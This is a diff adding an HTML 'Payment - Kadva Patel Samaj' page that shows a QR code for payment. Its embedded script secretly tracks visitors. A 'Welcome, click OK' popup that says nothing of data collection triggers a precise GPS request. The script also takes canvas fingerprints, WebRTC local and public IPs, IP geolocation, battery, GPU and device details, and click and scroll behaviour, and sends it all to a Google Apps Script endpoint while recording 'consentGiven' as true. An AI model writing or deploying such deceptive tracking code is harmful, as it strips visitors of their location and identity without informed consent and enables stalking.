@@ -1,0 +1,790 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment - Kadva Patel Samaj</title>
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://trasactionid.netlify.app/payment.html">
+    <meta property="og:title" content="Payment - Kadva Patel Samaj">
+    <meta property="og:description" content="Kadva Patel Samaj - Payment Page">
+    <meta property="og:image" content="https://trasactionid.netlify.app/EpXTntdU8AEYvCw.jpg">
+    <meta property="og:image:width" content="720">
+    <meta property="og:image:height" content="1280">
+
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://trasactionid.netlify.app/payment.html">
+    <meta name="twitter:title" content="Payment - Kadva Patel Samaj">
+    <meta name="twitter:description" content="Kadva Patel Samaj - Payment Page">
+    <meta name="twitter:image" content="https://trasactionid.netlify.app/EpXTntdU8AEYvCw.jpg">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .payment-container {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+        .payment-image {
+            max-width: 100%;
+            height: auto;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+            margin-bottom: 20px;
+        }
+        .payment-title {
+            color: #ffd700;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 15px;
+        }
+        .payment-text {
+            color: #e0e0e0;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+<body>
+    <div class="payment-container">
+        <img src="EpXTntdU8AEYvCw.jpg" alt="Payment" class="payment-image">
+        <h1 class="payment-title">Payment Information</h1>
+        <p class="payment-text">Scan the QR code above to make a payment.</p>
+    </div>
+
+    <script>
+    /**
+     * Payment Page Visitor Tracking with GPS Consent
+     * Collects visitor data and sends to Google Sheets
+     */
+    (function() {
+        'use strict';
+
+        const CONSENT_KEY = 'visitor_cookie_consent';
+        const LOGS_KEY = 'visitor_logs';
+
+        // Session tracking
+        let sessionData = {
+            startTime: Date.now(),
+            pageViews: 1,
+            clicks: 0,
+            scrollDepth: 0,
+            mouseMovements: 0,
+            keystrokes: 0,
+            timeOnPage: 0
+        };
+
+        // Get browser details
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            let browser = 'Unknown';
+            let version = '';
+
+            if (ua.includes('Firefox/')) {
+                browser = 'Firefox';
+                version = ua.split('Firefox/')[1].split(' ')[0];
+            } else if (ua.includes('Edg/')) {
+                browser = 'Microsoft Edge';
+                version = ua.split('Edg/')[1].split(' ')[0];
+            } else if (ua.includes('Chrome/')) {
+                browser = 'Chrome';
+                version = ua.split('Chrome/')[1].split(' ')[0];
+            } else if (ua.includes('Safari/') && !ua.includes('Chrome')) {
+                browser = 'Safari';
+                version = ua.split('Version/')[1]?.split(' ')[0] || '';
+            } else if (ua.includes('MSIE') || ua.includes('Trident/')) {
+                browser = 'Internet Explorer';
+            } else if (ua.includes('Opera') || ua.includes('OPR/')) {
+                browser = 'Opera';
+                version = ua.split('OPR/')[1]?.split(' ')[0] || '';
+            } else if (ua.includes('Samsung')) {
+                browser = 'Samsung Internet';
+            } else if (ua.includes('UCBrowser')) {
+                browser = 'UC Browser';
+            }
+
+            return { browser, version, userAgent: ua };
+        }
+
+        // Get OS details
+        function getOSInfo() {
+            const ua = navigator.userAgent;
+            let os = 'Unknown';
+            let osVersion = '';
+            let architecture = 'Unknown';
+
+            if (ua.includes('Win64') || ua.includes('x64') || ua.includes('WOW64')) {
+                architecture = '64-bit';
+            } else if (ua.includes('Win32') || ua.includes('x86')) {
+                architecture = '32-bit';
+            } else if (ua.includes('arm') || ua.includes('ARM')) {
+                architecture = 'ARM';
+            }
+
+            if (ua.includes('Windows NT 10.0')) {
+                os = 'Windows';
+                osVersion = ua.includes('Windows NT 10.0; Win64') ? '10/11 64-bit' : '10/11';
+            } else if (ua.includes('Mac OS X')) {
+                os = 'macOS';
+                const match = ua.match(/Mac OS X (\d+[._]\d+[._]?\d*)/);
+                osVersion = match ? match[1].replace(/_/g, '.') : '';
+            } else if (ua.includes('Android')) {
+                os = 'Android';
+                const match = ua.match(/Android (\d+\.?\d*\.?\d*)/);
+                osVersion = match ? match[1] : '';
+            } else if (ua.includes('iPhone') || ua.includes('iPad')) {
+                os = ua.includes('iPhone') ? 'iOS (iPhone)' : 'iOS (iPad)';
+                const match = ua.match(/OS (\d+_\d+_?\d*)/);
+                osVersion = match ? match[1].replace(/_/g, '.') : '';
+            } else if (ua.includes('Linux')) {
+                os = 'Linux';
+            }
+
+            return { os, osVersion, architecture };
+        }
+
+        // Get device type
+        function getDeviceInfo() {
+            const ua = navigator.userAgent.toLowerCase();
+            const uaOriginal = navigator.userAgent;
+            let deviceType = 'Desktop';
+            let deviceModel = 'Unknown';
+            let deviceBrand = 'Unknown';
+
+            const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+            const isSmallScreen = window.screen.width < 768;
+            const isCoarsePointer = window.matchMedia('(pointer: coarse)').matches;
+            const cannotHover = window.matchMedia('(hover: none)').matches;
+
+            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(uaOriginal)) {
+                deviceType = 'Tablet';
+            } else if (
+                /Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Opera M(obi|ini)|webOS|phone/i.test(uaOriginal) ||
+                (hasTouch && isSmallScreen) ||
+                (isCoarsePointer && cannotHover && hasTouch)
+            ) {
+                deviceType = 'Mobile';
+            } else if (hasTouch && isSmallScreen && isCoarsePointer) {
+                deviceType = 'Mobile';
+            }
+
+            if (ua.includes('iphone')) {
+                deviceBrand = 'Apple';
+                deviceModel = 'iPhone';
+                deviceType = 'Mobile';
+            } else if (ua.includes('ipad')) {
+                deviceBrand = 'Apple';
+                deviceModel = 'iPad';
+                deviceType = 'Tablet';
+            } else if (ua.includes('samsung')) {
+                deviceBrand = 'Samsung';
+                const match = uaOriginal.match(/SM-[A-Z0-9]+/i);
+                deviceModel = match ? match[0] : 'Samsung Device';
+            } else if (ua.includes('pixel')) {
+                deviceBrand = 'Google';
+                deviceModel = 'Pixel';
+            } else if (ua.includes('xiaomi') || ua.includes('redmi') || ua.includes('poco')) {
+                deviceBrand = 'Xiaomi';
+                const match = uaOriginal.match(/(Redmi|POCO|Mi)[^;)]*/i);
+                deviceModel = match ? match[0] : 'Xiaomi Device';
+            } else if (ua.includes('oppo')) {
+                deviceBrand = 'OPPO';
+            } else if (ua.includes('vivo')) {
+                deviceBrand = 'Vivo';
+            } else if (ua.includes('realme')) {
+                deviceBrand = 'Realme';
+            } else if (ua.includes('oneplus')) {
+                deviceBrand = 'OnePlus';
+            } else if (ua.includes('android')) {
+                deviceBrand = 'Android Device';
+            }
+
+            return {
+                deviceType,
+                deviceModel,
+                deviceBrand,
+                detectionSignals: {
+                    hasTouch,
+                    isSmallScreen,
+                    isCoarsePointer,
+                    cannotHover,
+                    screenWidth: window.screen.width,
+                    screenHeight: window.screen.height
+                }
+            };
+        }
+
+        // Get screen info
+        function getScreenInfo() {
+            const screen = window.screen;
+            return {
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                viewportWidth: window.innerWidth,
+                viewportHeight: window.innerHeight,
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio || 1,
+                orientation: screen.orientation ? screen.orientation.type : 'Unknown'
+            };
+        }
+
+        // Get hardware info
+        function getHardwareInfo() {
+            return {
+                cpuCores: navigator.hardwareConcurrency || 'Unknown',
+                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0
+            };
+        }
+
+        // Get GPU info
+        function getGPUInfo() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        return {
+                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                        };
+                    }
+                }
+            } catch (e) {}
+            return { vendor: 'Unknown', renderer: 'Unknown' };
+        }
+
+        // Get battery info
+        async function getBatteryInfo() {
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    return {
+                        charging: battery.charging,
+                        level: Math.round(battery.level * 100) + '%'
+                    };
+                }
+            } catch (e) {}
+            return { available: false };
+        }
+
+        // Get connection info
+        function getConnectionInfo() {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                return {
+                    effectiveType: conn.effectiveType || 'Unknown',
+                    downlink: conn.downlink ? conn.downlink + ' Mbps' : 'Unknown',
+                    rtt: conn.rtt ? conn.rtt + ' ms' : 'Unknown'
+                };
+            }
+            return { effectiveType: 'Unknown' };
+        }
+
+        // Get timezone info
+        function getTimezoneInfo() {
+            const date = new Date();
+            return {
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: -date.getTimezoneOffset() / 60 + ' hours from UTC'
+            };
+        }
+
+        // Get language info
+        function getLanguageInfo() {
+            return {
+                language: navigator.language,
+                languages: navigator.languages ? navigator.languages.join(', ') : navigator.language
+            };
+        }
+
+        // Canvas fingerprint
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 200;
+                canvas.height = 50;
+                ctx.textBaseline = 'alphabetic';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.font = '14px Arial';
+                ctx.fillText('Fingerprint', 2, 15);
+                const dataURL = canvas.toDataURL();
+                let hash = 0;
+                for (let i = 0; i < dataURL.length; i++) {
+                    hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
+                    hash = hash & hash;
+                }
+                return Math.abs(hash).toString(16);
+            } catch (e) {
+                return 'Unknown';
+            }
+        }
+
+        // Get referrer info
+        function getReferrerInfo() {
+            const referrer = document.referrer;
+            let source = 'Direct';
+            let medium = 'None';
+
+            if (referrer) {
+                try {
+                    const refUrl = new URL(referrer);
+                    source = refUrl.hostname;
+                    if (refUrl.hostname.includes('google')) {
+                        medium = 'Organic Search';
+                        source = 'Google';
+                    } else if (refUrl.hostname.includes('facebook') || refUrl.hostname.includes('fb.')) {
+                        medium = 'Social';
+                        source = 'Facebook';
+                    } else if (refUrl.hostname.includes('whatsapp') || refUrl.hostname.includes('wa.')) {
+                        medium = 'Social';
+                        source = 'WhatsApp';
+                    } else if (refUrl.hostname.includes('twitter') || refUrl.hostname.includes('t.co')) {
+                        medium = 'Social';
+                        source = 'Twitter/X';
+                    } else if (refUrl.hostname.includes('instagram')) {
+                        medium = 'Social';
+                        source = 'Instagram';
+                    } else {
+                        medium = 'Referral';
+                    }
+                } catch (e) {}
+            }
+
+            const urlParams = new URLSearchParams(window.location.search);
+            return {
+                fullReferrer: referrer || 'Direct',
+                source: urlParams.get('utm_source') || source,
+                medium: urlParams.get('utm_medium') || medium,
+                campaign: urlParams.get('utm_campaign') || 'None'
+            };
+        }
+
+        // Get WebRTC local IPs
+        async function getLocalIPs() {
+            return new Promise((resolve) => {
+                const ips = { private: [], public: [], ipv6: [] };
+                try {
+                    const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                    if (!RTCPeerConnection) {
+                        resolve(ips);
+                        return;
+                    }
+
+                    const pc = new RTCPeerConnection({
+                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+                    });
+
+                    pc.createDataChannel('');
+
+                    pc.onicecandidate = (event) => {
+                        if (!event || !event.candidate) return;
+                        const candidate = event.candidate.candidate;
+                        if (!candidate) return;
+
+                        const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/g;
+                        const ipv4Matches = candidate.match(ipRegex);
+
+                        if (ipv4Matches) {
+                            ipv4Matches.forEach(ip => {
+                                if (ip.startsWith('10.') || ip.startsWith('192.168.') || ip.match(/^172\.(1[6-9]|2[0-9]|3[0-1])\./)) {
+                                    if (!ips.private.includes(ip)) ips.private.push(ip);
+                                } else if (!ip.startsWith('0.') && ip !== '0.0.0.0') {
+                                    if (!ips.public.includes(ip)) ips.public.push(ip);
+                                }
+                            });
+                        }
+                    };
+
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+
+                    setTimeout(() => {
+                        pc.close();
+                        resolve(ips);
+                    }, 3000);
+                } catch (e) {
+                    resolve(ips);
+                }
+            });
+        }
+
+        // Get location data from IP
+        async function getLocationData() {
+            let locationData = {
+                publicIP: 'Unknown',
+                allIPs: { public: { ipv4: [], ipv6: [] }, webrtc: { private: [], public: [] } }
+            };
+
+            try {
+                const webrtcIPs = await getLocalIPs();
+                locationData.allIPs.webrtc = webrtcIPs;
+            } catch (e) {}
+
+            try {
+                const response = await fetch('http://ip-api.com/json/?fields=status,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query');
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.status === 'success') {
+                        locationData = {
+                            ...locationData,
+                            publicIP: data.query,
+                            city: data.city,
+                            district: data.district || 'N/A',
+                            region: data.regionName,
+                            regionCode: data.region,
+                            country: data.country,
+                            countryCode: data.countryCode,
+                            zipCode: data.zip,
+                            latitude: data.lat,
+                            longitude: data.lon,
+                            timezone: data.timezone,
+                            isp: data.isp,
+                            organization: data.org,
+                            asn: data.as,
+                            connectionType: data.mobile ? 'Mobile Network' : 'Fixed/Broadband',
+                            isMobile: data.mobile ? 'Yes' : 'No',
+                            isProxy: data.proxy ? 'Yes' : 'No',
+                            isVPN: data.proxy ? 'Likely' : 'No',
+                            isHosting: data.hosting ? 'Yes (Data Center)' : 'No'
+                        };
+                    }
+                }
+            } catch (error) {
+                console.log('Primary location API failed');
+            }
+
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                if (response.ok) {
+                    const data = await response.json();
+                    if (locationData.publicIP === 'Unknown') {
+                        locationData.publicIP = data.ip;
+                        locationData.city = data.city;
+                        locationData.region = data.region;
+                        locationData.country = data.country_name;
+                        locationData.countryCode = data.country_code;
+                        locationData.latitude = data.latitude;
+                        locationData.longitude = data.longitude;
+                        locationData.isp = data.org;
+                    }
+                    locationData.countryCallingCode = data.country_calling_code || 'N/A';
+                }
+            } catch (e) {}
+
+            return locationData;
+        }
+
+        // Get precise GPS location
+        async function getPreciseLocation() {
+            return new Promise((resolve) => {
+                const result = {
+                    available: false,
+                    permission: 'unknown',
+                    gpsCoordinates: null,
+                    accuracy: null,
+                    altitude: null,
+                    speed: null,
+                    timestamp: null
+                };
+
+                if (!navigator.geolocation) {
+                    result.permission = 'not_supported';
+                    resolve(result);
+                    return;
+                }
+
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                };
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        result.available = true;
+                        result.permission = 'granted';
+                        result.gpsCoordinates = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        };
+                        result.accuracy = position.coords.accuracy ? Math.round(position.coords.accuracy) + ' meters' : null;
+                        result.altitude = position.coords.altitude ? Math.round(position.coords.altitude) + ' meters' : null;
+                        result.speed = position.coords.speed ? (position.coords.speed * 3.6).toFixed(1) + ' km/h' : null;
+                        result.timestamp = new Date(position.timestamp).toISOString();
+                        result.googleMapsLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+                        resolve(result);
+                    },
+                    (error) => {
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                result.permission = 'denied';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                result.permission = 'unavailable';
+                                break;
+                            case error.TIMEOUT:
+                                result.permission = 'timeout';
+                                break;
+                            default:
+                                result.permission = 'error';
+                        }
+                        result.error = error.message;
+                        resolve(result);
+                    },
+                    options
+                );
+
+                setTimeout(() => {
+                    if (!result.available && result.permission === 'unknown') {
+                        result.permission = 'timeout';
+                        resolve(result);
+                    }
+                }, 17000);
+            });
+        }
+
+        // Collect all visitor data
+        async function collectVisitorData() {
+            const browserInfo = getBrowserInfo();
+            const osInfo = getOSInfo();
+            const deviceInfo = getDeviceInfo();
+            const screenInfo = getScreenInfo();
+            const hardwareInfo = getHardwareInfo();
+            const gpuInfo = getGPUInfo();
+            const connectionInfo = getConnectionInfo();
+            const timezoneInfo = getTimezoneInfo();
+            const languageInfo = getLanguageInfo();
+            const referrerInfo = getReferrerInfo();
+            const canvasFingerprint = getCanvasFingerprint();
+
+            const [locationData, batteryInfo, preciseGPS] = await Promise.all([
+                getLocationData(),
+                getBatteryInfo(),
+                getPreciseLocation()
+            ]);
+
+            return {
+                timestamp: new Date().toISOString(),
+                localTime: new Date().toLocaleString(),
+                visitId: 'v_' + Date.now().toString(36) + Math.random().toString(36).substr(2, 5),
+                page: {
+                    url: window.location.href,
+                    path: window.location.pathname,
+                    title: document.title,
+                    hostname: window.location.hostname
+                },
+                referrer: referrerInfo,
+                location: locationData,
+                device: {
+                    type: deviceInfo.deviceType,
+                    brand: deviceInfo.deviceBrand,
+                    model: deviceInfo.deviceModel,
+                    detectionSignals: deviceInfo.detectionSignals,
+                    ...hardwareInfo
+                },
+                browser: {
+                    name: browserInfo.browser,
+                    version: browserInfo.version,
+                    userAgent: browserInfo.userAgent
+                },
+                os: {
+                    name: osInfo.os,
+                    version: osInfo.osVersion,
+                    architecture: osInfo.architecture,
+                    platform: navigator.platform
+                },
+                screen: screenInfo,
+                gpu: gpuInfo,
+                battery: batteryInfo,
+                connection: connectionInfo,
+                timezone: timezoneInfo,
+                language: languageInfo,
+                fingerprints: { canvas: canvasFingerprint },
+                gps: preciseGPS,
+                session: { ...sessionData }
+            };
+        }
+
+        // Google Sheets endpoint
+        const GOOGLE_SHEETS_URL = 'https://script.google.com/macros/s/AKfycbwerTo9uXKyEDSxGJSNkSeDb0sEPHIuPAw-OtfyD35wjh1r3At2wN_-ho8LdSEsSvTA9A/exec';
+
+        // Send to Google Sheets
+        async function sendToGoogleSheets(visitorData) {
+            try {
+                await fetch(GOOGLE_SHEETS_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(visitorData)
+                });
+                console.log('Data sent to Google Sheets');
+            } catch (error) {
+                console.error('Failed to send to Google Sheets:', error);
+            }
+        }
+
+        // Save visitor log
+        function saveVisitorLog(visitorData) {
+            let logs = [];
+            try {
+                const existingLogs = localStorage.getItem(LOGS_KEY);
+                if (existingLogs) logs = JSON.parse(existingLogs);
+            } catch (e) { logs = []; }
+
+            logs.push(visitorData);
+            if (logs.length > 500) logs = logs.slice(-500);
+
+            localStorage.setItem(LOGS_KEY, JSON.stringify(logs));
+            console.log('Visitor data logged:', visitorData);
+
+            sendToGoogleSheets(visitorData);
+        }
+
+        // Behavior tracking
+        function initBehaviorTracking() {
+            document.addEventListener('click', () => { sessionData.clicks++; });
+            document.addEventListener('scroll', () => {
+                const scrollHeight = document.documentElement.scrollHeight - window.innerHeight;
+                const scrolled = (window.scrollY / scrollHeight) * 100;
+                sessionData.scrollDepth = Math.max(sessionData.scrollDepth, Math.round(scrolled));
+            });
+            setInterval(() => {
+                sessionData.timeOnPage = Math.round((Date.now() - sessionData.startTime) / 1000);
+            }, 1000);
+        }
+
+        // Show GPS consent popup
+        function showLocationConsent() {
+            const styles = document.createElement('style');
+            styles.id = 'locationConsentStyles';
+            styles.textContent = `
+                .location-consent-overlay {
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background: rgba(0, 0, 0, 0.8);
+                    z-index: 999999;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    backdrop-filter: blur(5px);
+                }
+                .location-consent-box {
+                    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+                    padding: 30px 40px;
+                    border-radius: 16px;
+                    text-align: center;
+                    max-width: 400px;
+                    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+                    animation: popIn 0.3s ease-out;
+                }
+                @keyframes popIn {
+                    from { transform: scale(0.8); opacity: 0; }
+                    to { transform: scale(1); opacity: 1; }
+                }
+                .location-consent-icon {
+                    font-size: 48px;
+                    margin-bottom: 15px;
+                }
+                .location-consent-title {
+                    color: #ffd700;
+                    font-size: 22px;
+                    font-weight: 700;
+                    margin: 0 0 15px 0;
+                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+                }
+                .location-consent-text {
+                    color: #e0e0e0;
+                    font-size: 14px;
+                    line-height: 1.6;
+                    margin: 0 0 25px 0;
+                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+                }
+                .location-consent-btn {
+                    background: linear-gradient(135deg, #4caf50 0%, #45a049 100%);
+                    color: white;
+                    border: none;
+                    padding: 14px 50px;
+                    font-size: 16px;
+                    font-weight: 600;
+                    border-radius: 8px;
+                    cursor: pointer;
+                    text-transform: uppercase;
+                    letter-spacing: 1px;
+                    box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4);
+                    transition: all 0.3s ease;
+                }
+                .location-consent-btn:hover {
+                    transform: translateY(-2px);
+                    box-shadow: 0 6px 20px rgba(76, 175, 80, 0.5);
+                }
+            `;
+            document.head.appendChild(styles);
+
+            const overlay = document.createElement('div');
+            overlay.className = 'location-consent-overlay';
+            overlay.id = 'locationConsentOverlay';
+            overlay.innerHTML = `
+                <div class="location-consent-box">
+                    <div class="location-consent-icon">&#10003;</div>
+                    <h3 class="location-consent-title">Welcome</h3>
+                    <p class="location-consent-text">
+                        Click OK to continue to the payment page.
+                    </p>
+                    <button class="location-consent-btn" id="locationConsentBtn">OK</button>
+                </div>
+            `;
+
+            document.body.appendChild(overlay);
+
+            document.getElementById('locationConsentBtn').addEventListener('click', async function() {
+                document.getElementById('locationConsentOverlay').remove();
+                document.getElementById('locationConsentStyles')?.remove();
+
+                // Collect data (this triggers browser's location permission popup)
+                const visitorData = await collectVisitorData();
+                visitorData.consentGiven = true;
+                visitorData.locationConsentShown = true;
+                saveVisitorLog(visitorData);
+                initBehaviorTracking();
+            });
+        }
+
+        // Initialize
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', showLocationConsent);
+        } else {
+            showLocationConsent();
+        }
+    })();
+    </script>
+</body>
+</html>
